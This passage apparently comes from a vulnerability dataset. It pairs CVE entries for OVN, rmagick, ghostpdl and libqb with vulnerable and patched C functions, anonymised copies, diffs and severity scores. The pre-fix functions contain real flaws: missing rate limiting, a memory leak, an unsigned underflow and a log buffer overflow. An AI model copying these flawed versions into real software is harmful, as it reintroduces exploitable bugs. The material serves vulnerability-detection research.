if (!mcast_sw_info->flood_unregistered) {
ds_clear(actions);
if (mcast_sw_info->flood_relay) {
ds_put_cstr(actions,
""clone { ""
""outport = \""""MC_MROUTER_FLOOD""\""; ""
""output; ""
""}; "");
}
if (mcast_sw_info->flood_static) {
ds_put_cstr(actions, ""outport =\""""MC_STATIC""\""; output;"");
}
if (!mcast_sw_info->flood_relay &&
!mcast_sw_info->flood_static) {
ds_put_cstr(actions, debug_drop_action());
}
ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 80,
""ip4.mcast || ip6.mcast"",
ds_cstr(actions));
}
}
ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 70, ""eth.mcast"",
""outport = \""""MC_FLOOD""\""; output;"");
}
}","static void
build_lswitch_destination_lookup_bmcast(struct ovn_datapath *VAR_0,
struct hmap *VAR_1,
struct ds *VAR_2,
const struct shash *VAR_3)
{
if (VAR_0->nbs) {
ovn_lflow_add(VAR_1, VAR_0, VAR_4, 110,
""eth.dst == $svc_monitor_mac && (tcp || icmp || icmp6)"",
""handle_svc_check(inport);"");
struct mcast_switch_info *VAR_5 = &VAR_0->mcast_info.sw;
if (VAR_5->enabled) {
ds_clear(VAR_2);
ds_put_cstr(VAR_2, ""igmp;"");
ovn_lflow_metered(VAR_1, VAR_0, VAR_4, 100,
""igmp"", ds_cstr(VAR_2),
copp_meter_get(VAR_6, VAR_0->nbs->copp,
VAR_3));
ovn_lflow_metered(VAR_1, VAR_0, VAR_4, 100,
""mldv1 || mldv2"", ds_cstr(VAR_2),
copp_meter_get(VAR_6, VAR_0->nbs->copp,
VAR_3));
ovn_lflow_add(VAR_1, VAR_0, VAR_4, 85,
""ip4.mcast && ip4.dst == 224.0.0.0/24"",
""outport = \""""VAR_7""\""; output;"");
ovn_lflow_add(VAR_1, VAR_0, VAR_4, 85,
""ip6.mcast_flood"",
""outport = \""""VAR_8""\""; output;"");
if (!VAR_5->flood_unregistered) {
ds_clear(VAR_2);
if (VAR_5->flood_relay) {
ds_put_cstr(VAR_2,
""clone { ""
""outport = \""""VAR_9""\""; ""
""output; ""
""}; "");
}
if (VAR_5->flood_static) {
ds_put_cstr(VAR_2, ""outport =\""""VAR_10""\""; output;"");
}
if (!VAR_5->flood_relay &&
!VAR_5->flood_static) {
ds_put_cstr(VAR_2, debug_drop_action());
}
ovn_lflow_add(VAR_1, VAR_0, VAR_4, 80,
""ip4.mcast || ip6.mcast"",
ds_cstr(VAR_2));
}
}
ovn_lflow_add(VAR_1, VAR_0, VAR_4, 70, ""eth.mcast"",
""outport = \""""VAR_8""\""; output;"");
}
}",ovn-org/ovn/9a3f7ed905e525ebdcb14541e775211cbb0203bd/northd.c/vul/before/0.json,"static void
build_lswitch_destination_lookup_bmcast(struct ovn_datapath *od,
                                        struct hmap *lflows,
                                        struct ds *actions,
                                        const struct shash *meter_groups)
{
    if (od->nbs) {

        ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 110, ""eth.dst == ""
                          ""$svc_monitor_mac && (tcp || icmp || icmp6)"",
                          ""handle_svc_check(inport);"",
                          copp_meter_get(COPP_SVC_MONITOR, od->nbs->copp,
                                         meter_groups));

        struct mcast_switch_info *mcast_sw_info = &od->mcast_info.sw;

        if (mcast_sw_info->enabled) {
            ds_clear(actions);
            ds_put_cstr(actions, ""igmp;"");
            /* Punt IGMP traffic to controller. */
            ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 100,
                              ""igmp"", ds_cstr(actions),
                              copp_meter_get(COPP_IGMP, od->nbs->copp,
                                             meter_groups));

            /* Punt MLD traffic to controller. */
            ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 100,
                              ""mldv1 || mldv2"", ds_cstr(actions),
                              copp_meter_get(COPP_IGMP, od->nbs->copp,
                                             meter_groups));

            /* Flood all IP multicast traffic destined to 224.0.0.X to all
             * ports - RFC 4541, section 2.1.2, item 2.
             */
            ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 85,
                          ""ip4.mcast && ip4.dst == 224.0.0.0/24"",
                          ""outport = \""""MC_FLOOD_L2""\""; output;"");

            /* Flood all IPv6 multicast traffic destined to reserved
             * multicast IPs (RFC 4291, 2.7.1).
             */
            ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 85,
                          ""ip6.mcast_flood"",
                          ""outport = \""""MC_FLOOD""\""; output;"");

            /* Forward uregistered IP multicast to routers with relay enabled
             * and to any ports configured to flood IP multicast traffic.
             * If configured to flood unregistered traffic this will be
             * handled by the L2 multicast flow.
             */
            if (!mcast_sw_info->flood_unregistered) {
                ds_clear(actions);

                if (mcast_sw_info->flood_relay) {
                    ds_put_cstr(actions,
                                ""clone { ""
                                    ""outport = \""""MC_MROUTER_FLOOD""\""; ""
                                    ""output; ""
                                ""}; "");
                }

                if (mcast_sw_info->flood_static) {
                    ds_put_cstr(actions, ""outport =\""""MC_STATIC""\""; output;"");
                }

                /* Explicitly drop the traffic if relay or static flooding
                 * is not configured.
                 */
                if (!mcast_sw_info->flood_relay &&
                        !mcast_sw_info->flood_static) {
                    ds_put_cstr(actions, debug_drop_action());
                }

                ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 80,
                              ""ip4.mcast || ip6.mcast"",
                              ds_cstr(actions));
            }
        }

        ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 70, ""eth.mcast"",
                      ""outport = \""""MC_FLOOD""\""; output;"");
    }
}","static void
build_lswitch_destination_lookup_bmcast(struct ovn_datapath *VAR_0,
                                        struct hmap *VAR_1,
                                        struct ds *VAR_2,
                                        const struct shash *VAR_3)
{
    if (VAR_0->nbs) {

        ovn_lflow_metered(VAR_1, VAR_0, VAR_4, 110, ""eth.dst == ""
                          ""$svc_monitor_mac && (tcp || icmp || icmp6)"",
                          ""handle_svc_check(inport);"",
                          copp_meter_get(VAR_5, VAR_0->nbs->copp,
                                         VAR_3));

        struct mcast_switch_info *VAR_6 = &VAR_0->mcast_info.sw;

        if (VAR_6->enabled) {
            ds_clear(VAR_2);
            ds_put_cstr(VAR_2, ""igmp;"");
            /* COMMENT_0 */
            ovn_lflow_metered(VAR_1, VAR_0, VAR_4, 100,
                              ""igmp"", ds_cstr(VAR_2),
                              copp_meter_get(VAR_7, VAR_0->nbs->copp,
                                             VAR_3));

            /* COMMENT_1 */
            ovn_lflow_metered(VAR_1, VAR_0, VAR_4, 100,
                              ""mldv1 || mldv2"", ds_cstr(VAR_2),
                              copp_meter_get(VAR_7, VAR_0->nbs->copp,
                                             VAR_3));

            /* COMMENT_2 */
                                                       
               
            ovn_lflow_add(VAR_1, VAR_0, VAR_4, 85,
                          ""ip4.mcast && ip4.dst == 224.0.0.0/24"",
                          ""outport = \""""VAR_8""\""; output;"");

            /* COMMENT_5 */
                                               
               
            ovn_lflow_add(VAR_1, VAR_0, VAR_4, 85,
                          ""ip6.mcast_flood"",
                          ""outport = \""""VAR_9""\""; output;"");

            /* COMMENT_8 */
                                                                         
                                                                       
                                                
               
            if (!VAR_6->flood_unregistered) {
                ds_clear(VAR_2);

                if (VAR_6->flood_relay) {
                    ds_put_cstr(VAR_2,
                                ""clone { ""
                                    ""outport = \""""VAR_10""\""; ""
                                    ""output; ""
                                ""}; "");
                }

                if (VAR_6->flood_static) {
                    ds_put_cstr(VAR_2, ""outport =\""""VAR_11""\""; output;"");
                }

                /* COMMENT_13 */
                                     
                   
                if (!VAR_6->flood_relay &&
                        !VAR_6->flood_static) {
                    ds_put_cstr(VAR_2, debug_drop_action());
                }

                ovn_lflow_add(VAR_1, VAR_0, VAR_4, 80,
                              ""ip4.mcast || ip6.mcast"",
                              ds_cstr(VAR_2));
            }
        }

        ovn_lflow_add(VAR_1, VAR_0, VAR_4, 70, ""eth.mcast"",
                      ""outport = \""""VAR_9""\""; output;"");
    }
}",ovn-org/ovn/9a3f7ed905e525ebdcb14541e775211cbb0203bd/northd.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,9 +6,11 @@
 {
     if (od->nbs) {
 
-        ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 110,
-                      ""eth.dst == $svc_monitor_mac && (tcp || icmp || icmp6)"",
-                      ""handle_svc_check(inport);"");
+        ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 110, ""eth.dst == ""
+                          ""$svc_monitor_mac && (tcp || icmp || icmp6)"",
+                          ""handle_svc_check(inport);"",
+                          copp_meter_get(COPP_SVC_MONITOR, od->nbs->copp,
+                                         meter_groups));
 
         struct mcast_switch_info *mcast_sw_info = &od->mcast_info.sw;
 ","{'deleted_lines': ['        ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 110,', '                      ""eth.dst == $svc_monitor_mac && (tcp || icmp || icmp6)"",', '                      ""handle_svc_check(inport);"");'], 'added_lines': ['        ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 110, ""eth.dst == ""', '                          ""$svc_monitor_mac && (tcp || icmp || icmp6)"",', '                          ""handle_svc_check(inport);"",', '                          copp_meter_get(COPP_SVC_MONITOR, od->nbs->copp,', '                                         meter_groups));']}",True,"A flaw was found in Open Virtual Network where the service monitor MAC does not properly rate limit. This issue could allow an attacker to cause a denial of service, including on deployments with CoPP enabled and properly configured.",5.3,MEDIUM,1,valid,2023-07-12T05:12:29Z,4
CVE-2023-5349,['CWE-401'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L,1,rmagick,Fix memory leak in `Magick::Draw` for recentry ImageMagick 6 by removing unnecessary `GetDrawInfo()` calling,da823515a13130010f74678dc48f8b08a70cbd14,https://github.com/rmagick/rmagick/commit/da823515a13130010f74678dc48f8b08a70cbd14,ext/RMagick/rmdraw.c,DrawOptions_initialize,"VALUE
DrawOptions_initialize(VALUE self)
{
Draw *draw_options;
TypedData_Get_Struct(self, Draw, &rm_draw_data_type, draw_options);
draw_options->info = AcquireDrawInfo();
if (!draw_options->info)
{
rb_raise(rb_eNoMemError, ""not enough memory to continue"");
}
GetDrawInfo(NULL, draw_options->info);
if (rb_block_given_p())
{
rb_yield(self);
}
return self;
}","VALUE
DrawOptions_initialize(VALUE VAR_0)
{
Draw *VAR_1;
TypedData_Get_Struct(VAR_0, Draw, &VAR_2, VAR_1);
VAR_1->info = AcquireDrawInfo();
if (!VAR_1->info)
{
rb_raise(VAR_3, ""not enough memory to continue"");
}
GetDrawInfo(NULL, VAR_1->info);
if (rb_block_given_p())
{
rb_yield(VAR_0);
}
return VAR_0;
}",rmagick/da823515a13130010f74678dc48f8b08a70cbd14/rmdraw.c/vul/before/0.json,"VALUE
DrawOptions_initialize(VALUE self)
{
    Draw *draw_options;

    TypedData_Get_Struct(self, Draw, &rm_draw_data_type, draw_options);
    draw_options->info = AcquireDrawInfo();
    if (!draw_options->info)
    {
        rb_raise(rb_eNoMemError, ""not enough memory to continue"");
    }

    if (rb_block_given_p())
    {
        rb_yield(self);
    }

    return self;
}","VALUE
DrawOptions_initialize(VALUE VAR_0)
{
    Draw *VAR_1;

    TypedData_Get_Struct(VAR_0, Draw, &VAR_2, VAR_1);
    VAR_1->info = AcquireDrawInfo();
    if (!VAR_1->info)
    {
        rb_raise(VAR_3, ""not enough memory to continue"");
    }

    if (rb_block_given_p())
    {
        rb_yield(VAR_0);
    }

    return VAR_0;
}",rmagick/da823515a13130010f74678dc48f8b08a70cbd14/rmdraw.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,8 +10,6 @@
         rb_raise(rb_eNoMemError, ""not enough memory to continue"");
     }
 
-    GetDrawInfo(NULL, draw_options->info);
-
     if (rb_block_given_p())
     {
         rb_yield(self);","{'deleted_lines': ['    GetDrawInfo(NULL, draw_options->info);', ''], 'added_lines': []}",True,"A memory leak flaw was found in ruby-magick, an interface between Ruby and ImageMagick. This issue can lead to a denial of service (DOS) by memory exhaustion.",5.3,MEDIUM,1,valid,2023-07-16T08:59:52Z,4
CVE-2023-38560,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ArtifexSoftware/ghostpdl,"Bug 706898: pcl - deal with corrupt numGlyphs in a TTF

A corrupt TrueType font can end up with a numGlyphs of 0, which we stored in an
unsigned value. Checking the validity of a GID we subtract 1 from numGlyphs,
having undesireable effects with an unsigned value.",b7eb1d0174c,https://github.com/ArtifexSoftware/ghostpdl/commit/b7eb1d0174cb25a0cd44a1c0706c2ed73fc95bef,pcl/pl/plfont.c,pl_glyph_name,"static int
pl_glyph_name(gs_font * pfont, gs_glyph glyph, gs_const_string * pstr)
{
uint table_length;
ulong table_offset;
pl_font_t * plfont = (pl_font_t *)pfont->client_data;
if (glyph >= GS_MIN_GLYPH_INDEX)
glyph -= GS_MIN_GLYPH_INDEX;
if (pfont->FontType != ft_TrueType) {
glyph -= 29;
if (glyph < 258) {
pstr->data = (const byte *)pl_mac_names[glyph];
pstr->size = strlen((const char *)pstr->data);
return 0;
} else {
if_debug1m('=', pfont->memory,
""[=]glyph index %lx out of range\n"", (ulong) glyph);
return -1;
}
}
table_offset =
tt_find_table((gs_font_type42 *) pfont, ""post"", &table_length);
if (table_offset == 0)
return -1;
if (table_length == 0)
return -1;
{
ulong format;
uint numGlyphs;
uint glyph_name_index;
const byte *postp;      
((gs_font_type42 *) pfont)->data.string_proc((gs_font_type42 *) pfont,
table_offset,
table_length, &postp);
format = u32(postp);
if (format != 0x20000) {
dmprintf1(pfont->memory, ""unknown post table format %lX\n"",
format);
return -1;
}
numGlyphs = u16(postp + 32);
if (glyph > numGlyphs - 1) {
if_debug1m('=', pfont->memory,
""[=]glyph index %lx out of range\n"", glyph);
return -1;
}
glyph_name_index = u16(postp + 34 + (glyph * 2));
if (glyph_name_index > 0x7fff)
return -1;
if (glyph_name_index < 258) {
pstr->data = (const byte *)pl_mac_names[glyph_name_index];
pstr->size = strlen((const char *)pstr->data);
return 0;
} else {
byte *mydata;
const byte *pascal_stringp = postp + 34 + (numGlyphs * 2);
glyph_name_index -= 258;
while (glyph_name_index > 0) {
pascal_stringp += ((int)(*pascal_stringp) + 1);
glyph_name_index--;
}
pstr->size = (int)(*pascal_stringp);
pstr->data = pascal_stringp + 1;
if (pstr->data + pstr->size > postp + table_length ||
pstr->data - 1 < postp) {
dmprintf(pfont->memory, ""data out of range\n"");
return -1;
}
mydata =
gs_alloc_bytes(pfont->memory, pstr->size + 1,
""glyph to name"");
if (mydata == 0)
return -1;
memcpy(mydata, pascal_stringp + 1, pstr->size);
pstr->data = mydata;
if (plfont->names == NULL) {
plfont->names = (char **)gs_alloc_bytes(pfont->memory, 256 * sizeof (char *), ""names storage"");
if (plfont->names == NULL) {
gs_free_object(pfont->memory, (byte *)pstr->data, ""free string on error"");
pstr->data = NULL;
pstr->size = 0;
return -1;
}
plfont->max_name_index = 255;
plfont->next_name_index = 0;
memset(plfont->names, 0x00, 256 * sizeof (char *));
}
if (plfont->next_name_index > plfont->max_name_index) {
char **temp = NULL;
temp = (char **)gs_alloc_bytes(pfont->memory, (plfont->max_name_index + 256) * sizeof (char *), ""names storage"");
if (temp == NULL) {
gs_free_object(pfont->memory, (byte *)pstr->data, ""free string on error"");
pstr->data = NULL;
pstr->size = 0;
return -1;
}
memset(temp, 0x00, (plfont->max_name_index + 256) * sizeof (char *));
memcpy(temp, plfont->names, plfont->max_name_index * sizeof(char *));
gs_free_object(pfont->memory, (void *)plfont->names, ""realloc names storage"");
plfont->names = temp;
plfont->max_name_index += 256;
}
plfont->names[plfont->next_name_index++] = (char *)pstr->data;
return 0;
}
}
return 0;
}","static int
pl_glyph_name(gs_font * VAR_0, gs_glyph VAR_1, gs_const_string * VAR_2)
{
uint VAR_3;
ulong VAR_4;
pl_font_t * VAR_5 = (pl_font_t *)VAR_0->client_data;
if (VAR_1 >= VAR_6)
VAR_1 -= VAR_6;
if (VAR_0->FontType != VAR_7) {
VAR_1 -= 29;
if (VAR_1 < 258) {
VAR_2->data = (const byte *)VAR_8[VAR_1];
VAR_2->size = strlen((const char *)VAR_2->data);
return 0;
} else {
if_debug1m('=', VAR_0->memory,
""[=]glyph index %lx out of range\n"", (ulong) VAR_1);
return -1;
}
}
VAR_4 =
tt_find_table((gs_font_type42 *) VAR_0, ""post"", &VAR_3);
if (VAR_4 == 0)
return -1;
if (VAR_3 == 0)
return -1;
{
ulong VAR_9;
uint VAR_10;
uint VAR_11;
const byte *VAR_12;      
((gs_font_type42 *) VAR_0)->data.string_proc((gs_font_type42 *) VAR_0,
VAR_4,
VAR_3, &VAR_12);
VAR_9 = u32(VAR_12);
if (VAR_9 != 0x20000) {
dmprintf1(VAR_0->memory, ""unknown post table format %lX\n"",
VAR_9);
return -1;
}
VAR_10 = u16(VAR_12 + 32);
if (VAR_1 > VAR_10 - 1) {
if_debug1m('=', VAR_0->memory,
""[=]glyph index %lx out of range\n"", VAR_1);
return -1;
}
VAR_11 = u16(VAR_12 + 34 + (VAR_1 * 2));
if (VAR_11 > 0x7fff)
return -1;
if (VAR_11 < 258) {
VAR_2->data = (const byte *)VAR_8[VAR_11];
VAR_2->size = strlen((const char *)VAR_2->data);
return 0;
} else {
byte *VAR_13;
const byte *VAR_14 = VAR_12 + 34 + (VAR_10 * 2);
VAR_11 -= 258;
while (VAR_11 > 0) {
VAR_14 += ((int)(*VAR_14) + 1);
VAR_11--;
}
VAR_2->size = (int)(*VAR_14);
VAR_2->data = VAR_14 + 1;
if (VAR_2->data + VAR_2->size > VAR_12 + VAR_3 ||
VAR_2->data - 1 < VAR_12) {
dmprintf(VAR_0->memory, ""data out of range\n"");
return -1;
}
VAR_13 =
gs_alloc_bytes(VAR_0->memory, VAR_2->size + 1,
""glyph to name"");
if (VAR_13 == 0)
return -1;
memcpy(VAR_13, VAR_14 + 1, VAR_2->size);
VAR_2->data = VAR_13;
if (VAR_5->names == NULL) {
VAR_5->names = (char **)gs_alloc_bytes(VAR_0->memory, 256 * sizeof (char *), ""names storage"");
if (VAR_5->names == NULL) {
gs_free_object(VAR_0->memory, (byte *)VAR_2->data, ""free string on error"");
VAR_2->data = NULL;
VAR_2->size = 0;
return -1;
}
VAR_5->max_name_index = 255;
VAR_5->next_name_index = 0;
memset(VAR_5->names, 0x00, 256 * sizeof (char *));
}
if (VAR_5->next_name_index > VAR_5->max_name_index) {
char **VAR_15 = NULL;
VAR_15 = (char **)gs_alloc_bytes(VAR_0->memory, (VAR_5->max_name_index + 256) * sizeof (char *), ""names storage"");
if (VAR_15 == NULL) {
gs_free_object(VAR_0->memory, (byte *)VAR_2->data, ""free string on error"");
VAR_2->data = NULL;
VAR_2->size = 0;
return -1;
}
memset(VAR_15, 0x00, (VAR_5->max_name_index + 256) * sizeof (char *));
memcpy(VAR_15, VAR_5->names, VAR_5->max_name_index * sizeof(char *));
gs_free_object(VAR_0->memory, (void *)VAR_5->names, ""realloc names storage"");
VAR_5->names = VAR_15;
VAR_5->max_name_index += 256;
}
VAR_5->names[VAR_5->next_name_index++] = (char *)VAR_2->data;
return 0;
}
}
return 0;
}",ArtifexSoftware/ghostpdl/b7eb1d0174c/plfont.c/vul/before/0.json,"static int
pl_glyph_name(gs_font * pfont, gs_glyph glyph, gs_const_string * pstr)
{
    uint table_length;
    ulong table_offset;
    pl_font_t * plfont = (pl_font_t *)pfont->client_data;

    if (glyph >= GS_MIN_GLYPH_INDEX)
        glyph -= GS_MIN_GLYPH_INDEX;

    /* guess if the font type is not truetype */
    if (pfont->FontType != ft_TrueType) {
        glyph -= 29;
        if (glyph < 258) {
            pstr->data = (const byte *)pl_mac_names[glyph];
            pstr->size = strlen((const char *)pstr->data);
            return 0;
        } else {
            if_debug1m('=', pfont->memory,
                       ""[=]glyph index %lx out of range\n"", (ulong) glyph);
            return -1;
        }
    }

    table_offset =
        tt_find_table((gs_font_type42 *) pfont, ""post"", &table_length);
    /* no post table */
    if (table_offset == 0)
        return -1;
    /* this shoudn't happen but... */
    if (table_length == 0)
        return -1;

    {
        ulong format;
        int numGlyphs;
        uint glyph_name_index;
        const byte *postp;      /* post table pointer */

        ((gs_font_type42 *) pfont)->data.string_proc((gs_font_type42 *) pfont,
                                                     table_offset,
                                                     table_length, &postp);
        format = u32(postp);
        if (format != 0x20000) {
            /* format 1.0 (mac encoding) is a simple table see the TT
               spec.  We don't implement this because we don't see it
               in practice */
            dmprintf1(pfont->memory, ""unknown post table format %lX\n"",
                      format);
            return -1;
        }
        /* skip over the post header */
        numGlyphs = (int)u16(postp + 32);
        if ((int)glyph > numGlyphs - 1) {
            if_debug1m('=', pfont->memory,
                       ""[=]glyph index %lx out of range\n"", glyph);
            return -1;
        }
        /* glyph name index starts at post + 34 each entry is 2 bytes */
        glyph_name_index = u16(postp + 34 + (glyph * 2));
        /* this shouldn't happen */
        if (glyph_name_index > 0x7fff)
            return -1;
        /* mac easy */
        if (glyph_name_index < 258) {

            pstr->data = (const byte *)pl_mac_names[glyph_name_index];
            pstr->size = strlen((const char *)pstr->data);
            return 0;
            /* not mac */
        } else {
            byte *mydata;
            /* and here's the tricky part */
            const byte *pascal_stringp = postp + 34 + (numGlyphs * 2);
            /* 0 - 257 lives in the mac table above */
            glyph_name_index -= 258;
            /* The string we want is the index'th pascal string,
               so we ""hop"" to each length byte ""index"" times. */
            while (glyph_name_index > 0) {
                pascal_stringp += ((int)(*pascal_stringp) + 1);
                glyph_name_index--;
            }
            /* length byte */
            pstr->size = (int)(*pascal_stringp);
            /* + 1 is for the length byte */
            pstr->data = pascal_stringp + 1;
            /* sanity check */
            if (pstr->data + pstr->size > postp + table_length ||
                pstr->data - 1 < postp) {
                dmprintf(pfont->memory, ""data out of range\n"");
                return -1;
            }
            /* sigh - we have to allocate a copy of the data - by the
               time a high level device makes use of it the font data
               may be freed.  Track the allocated memory in our
               font 'wrapper' so we can free it when we free tha font wrapper.
             */
            mydata =
                gs_alloc_bytes(pfont->memory, pstr->size + 1,
                               ""glyph to name"");
            if (mydata == 0)
                return -1;
            memcpy(mydata, pascal_stringp + 1, pstr->size);
            pstr->data = mydata;
            if (plfont->names == NULL) {
                plfont->names = (char **)gs_alloc_bytes(pfont->memory, 256 * sizeof (char *), ""names storage"");
                if (plfont->names == NULL) {
                    gs_free_object(pfont->memory, (byte *)pstr->data, ""free string on error"");
                    pstr->data = NULL;
                    pstr->size = 0;
                    return -1;
                }
                plfont->max_name_index = 255;
                plfont->next_name_index = 0;
                memset(plfont->names, 0x00, 256 * sizeof (char *));
            }
            if (plfont->next_name_index > plfont->max_name_index) {
                char **temp = NULL;
                temp = (char **)gs_alloc_bytes(pfont->memory, (plfont->max_name_index + 256) * sizeof (char *), ""names storage"");
                if (temp == NULL) {
                    gs_free_object(pfont->memory, (byte *)pstr->data, ""free string on error"");
                    pstr->data = NULL;
                    pstr->size = 0;
                    return -1;
                }
                memset(temp, 0x00, (plfont->max_name_index + 256) * sizeof (char *));
                memcpy(temp, plfont->names, plfont->max_name_index * sizeof(char *));
                gs_free_object(pfont->memory, (void *)plfont->names, ""realloc names storage"");
                plfont->names = temp;
                plfont->max_name_index += 256;
            }
            plfont->names[plfont->next_name_index++] = (char *)pstr->data;
            return 0;
        }
    }
    return 0;
}","static int
pl_glyph_name(gs_font * VAR_0, gs_glyph VAR_1, gs_const_string * VAR_2)
{
    uint VAR_3;
    ulong VAR_4;
    pl_font_t * VAR_5 = (pl_font_t *)VAR_0->client_data;

    if (VAR_1 >= VAR_6)
        VAR_1 -= VAR_6;

    /* COMMENT_0 */
    if (VAR_0->FontType != VAR_7) {
        VAR_1 -= 29;
        if (VAR_1 < 258) {
            VAR_2->data = (const byte *)VAR_8[VAR_1];
            VAR_2->size = strlen((const char *)VAR_2->data);
            return 0;
        } else {
            if_debug1m('=', VAR_0->memory,
                       ""[=]glyph index %lx out of range\n"", (ulong) VAR_1);
            return -1;
        }
    }

    VAR_4 =
        tt_find_table((gs_font_type42 *) VAR_0, ""post"", &VAR_3);
    /* COMMENT_1 */
    if (VAR_4 == 0)
        return -1;
    /* COMMENT_2 */
    if (VAR_3 == 0)
        return -1;

    {
        ulong VAR_9;
        int VAR_10;
        uint VAR_11;
        const byte *VAR_12;      /* COMMENT_3 */

        ((gs_font_type42 *) VAR_0)->data.string_proc((gs_font_type42 *) VAR_0,
                                                     VAR_4,
                                                     VAR_3, &VAR_12);
        VAR_9 = u32(VAR_12);
        if (VAR_9 != 0x20000) {
            /* COMMENT_4 */
                                                                     
                             
            dmprintf1(VAR_0->memory, ""unknown post table format %lX\n"",
                      VAR_9);
            return -1;
        }
        /* COMMENT_7 */
        VAR_10 = (int)u16(VAR_12 + 32);
        if ((int)VAR_1 > VAR_10 - 1) {
            if_debug1m('=', VAR_0->memory,
                       ""[=]glyph index %lx out of range\n"", VAR_1);
            return -1;
        }
        /* COMMENT_8 */
        VAR_11 = u16(VAR_12 + 34 + (VAR_1 * 2));
        /* COMMENT_9 */
        if (VAR_11 > 0x7fff)
            return -1;
        /* COMMENT_10 */
        if (VAR_11 < 258) {

            VAR_2->data = (const byte *)VAR_8[VAR_11];
            VAR_2->size = strlen((const char *)VAR_2->data);
            return 0;
            /* COMMENT_11 */
        } else {
            byte *VAR_13;
            /* COMMENT_12 */
            const byte *VAR_14 = VAR_12 + 34 + (VAR_10 * 2);
            /* COMMENT_13 */
            VAR_11 -= 258;
            /* COMMENT_14 */
                                                                
            while (VAR_11 > 0) {
                VAR_14 += ((int)(*VAR_14) + 1);
                VAR_11--;
            }
            /* COMMENT_16 */
            VAR_2->size = (int)(*VAR_14);
            /* COMMENT_17 */
            VAR_2->data = VAR_14 + 1;
            /* COMMENT_18 */
            if (VAR_2->data + VAR_2->size > VAR_12 + VAR_3 ||
                VAR_2->data - 1 < VAR_12) {
                dmprintf(VAR_0->memory, ""data out of range\n"");
                return -1;
            }
            /* COMMENT_19 */
                                                                     
                                                               
                                                                              
               
            VAR_13 =
                gs_alloc_bytes(VAR_0->memory, VAR_2->size + 1,
                               ""glyph to name"");
            if (VAR_13 == 0)
                return -1;
            memcpy(VAR_13, VAR_14 + 1, VAR_2->size);
            VAR_2->data = VAR_13;
            if (VAR_5->names == NULL) {
                VAR_5->names = (char **)gs_alloc_bytes(VAR_0->memory, 256 * sizeof (char *), ""names storage"");
                if (VAR_5->names == NULL) {
                    gs_free_object(VAR_0->memory, (byte *)VAR_2->data, ""free string on error"");
                    VAR_2->data = NULL;
                    VAR_2->size = 0;
                    return -1;
                }
                VAR_5->max_name_index = 255;
                VAR_5->next_name_index = 0;
                memset(VAR_5->names, 0x00, 256 * sizeof (char *));
            }
            if (VAR_5->next_name_index > VAR_5->max_name_index) {
                char **VAR_15 = NULL;
                VAR_15 = (char **)gs_alloc_bytes(VAR_0->memory, (VAR_5->max_name_index + 256) * sizeof (char *), ""names storage"");
                if (VAR_15 == NULL) {
                    gs_free_object(VAR_0->memory, (byte *)VAR_2->data, ""free string on error"");
                    VAR_2->data = NULL;
                    VAR_2->size = 0;
                    return -1;
                }
                memset(VAR_15, 0x00, (VAR_5->max_name_index + 256) * sizeof (char *));
                memcpy(VAR_15, VAR_5->names, VAR_5->max_name_index * sizeof(char *));
                gs_free_object(VAR_0->memory, (void *)VAR_5->names, ""realloc names storage"");
                VAR_5->names = VAR_15;
                VAR_5->max_name_index += 256;
            }
            VAR_5->names[VAR_5->next_name_index++] = (char *)VAR_2->data;
            return 0;
        }
    }
    return 0;
}",ArtifexSoftware/ghostpdl/b7eb1d0174c/plfont.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -33,7 +33,7 @@
 
     {
         ulong format;
-        uint numGlyphs;
+        int numGlyphs;
         uint glyph_name_index;
         const byte *postp;      /* post table pointer */
 
@@ -50,8 +50,8 @@
             return -1;
         }
         /* skip over the post header */
-        numGlyphs = u16(postp + 32);
-        if (glyph > numGlyphs - 1) {
+        numGlyphs = (int)u16(postp + 32);
+        if ((int)glyph > numGlyphs - 1) {
             if_debug1m('=', pfont->memory,
                        ""[=]glyph index %lx out of range\n"", glyph);
             return -1;","{'deleted_lines': ['        uint numGlyphs;', '        numGlyphs = u16(postp + 32);', '        if (glyph > numGlyphs - 1) {'], 'added_lines': ['        int numGlyphs;', '        numGlyphs = (int)u16(postp + 32);', '        if ((int)glyph > numGlyphs - 1) {']}",True,An integer overflow flaw was found in pcl/pl/plfont.c:418 in pl_glyph_name in ghostscript. This issue may allow a local attacker to cause a denial of service via transforming a crafted PCL file to PDF format.,5.5,MEDIUM,1,valid,2023-07-17T12:57:27Z,4
CVE-2023-39976,['CWE-120'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,ClusterLabs/libqb,"log: fix potential overflow with long log messages (#490)

qb_vsnprintf_serialize was called with 'max_size' as the
limiting number for the length of the formatted log
message. But the buffer also needs to contain the
log header (given by 'actual_size'), so we now pass
't->max_line_length' as the maximum length of the
formatted log message to limit space to the actual 
bytes left

Also added error checks to the blackbox calls at
the end of the test, as these now provide a proper
test that the BB is functioning. Before they were
masking failures.",1bbaa929b77113532785c408dd1b41cd0521ffc8,https://github.com/ClusterLabs/libqb/commit/1bbaa929b77113532785c408dd1b41cd0521ffc8,lib/log_blackbox.c,_blackbox_vlogger,"static void
_blackbox_vlogger(int32_t target,
struct qb_log_callsite *cs, struct timespec *timestamp, va_list ap)
{
size_t max_size;
size_t actual_size;
uint32_t fn_size;
char *chunk;
char *msg_len_pt;
uint32_t msg_len;
struct qb_log_target *t = qb_log_target_get(target);
if (t->instance == NULL) {
return;
}
fn_size = strlen(cs->function) + 1;
actual_size = 4 * sizeof(uint32_t) + sizeof(uint8_t) + fn_size + sizeof(struct timespec);
